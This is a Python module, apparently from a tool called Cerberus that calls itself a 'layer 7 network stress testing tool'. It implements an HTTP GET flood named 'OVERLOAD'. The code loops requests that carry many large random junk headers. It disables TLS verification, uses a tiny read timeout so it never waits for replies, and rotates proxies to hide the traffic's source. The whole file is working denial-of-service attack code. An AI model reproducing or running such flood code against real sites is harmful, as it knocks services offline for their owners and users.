'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests, urllib3

from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            headers = {'User-Agent': urllib3.util.SKIP_HEADER}
            for _ in range(randint(8,16)): # append some random data to the dictionary
                key = utils().randstr(randint(50,100))
                value = utils().randstr(randint(200, 400))

                headers[key] = value

            Core.session.get(
                utils().buildblock(url), 
                headers=headers,
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies=utils().get_proxy()
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception as e:
            print(e)
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'OVERLOAD': {
        'info': 'HTTP GET flood that fills the headers dictionary with lots of junk data',
        'func': flood
    }
})